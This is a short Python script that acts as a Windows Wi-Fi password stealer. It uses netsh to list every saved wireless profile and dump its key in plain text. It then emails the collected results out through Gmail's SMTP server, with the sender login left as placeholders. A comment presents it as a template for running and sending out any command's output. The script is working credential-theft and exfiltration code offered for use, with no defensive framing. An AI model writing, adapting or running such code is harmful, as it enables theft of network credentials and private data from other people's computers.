import subprocess
import re
import smtplib


def send_email(email, password, content):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, content)
    server.quit()


command = "netsh wlan show profile"
''' The above mentioned command will send the information about wifi networks on which the computer has been connected before.
It can be replaced with any command or a chain of commands
'''
wifi = subprocess.check_output(command, shell=True)
wifi_list = re.findall(b"(?:Profile\s*:\s)(.*)", wifi)

result = ""
for i in wifi_list:
    command = str("netsh wlan show profile " + str(i.decode("utf-8")) + " key=clear")
    current_result = subprocess.check_output(command,shell=True)
    result = str(result) + str(current_result)

send_email("email comes here", "password comes here", result)
#Note : allow access to less secure apps should be turned on for receiving the email
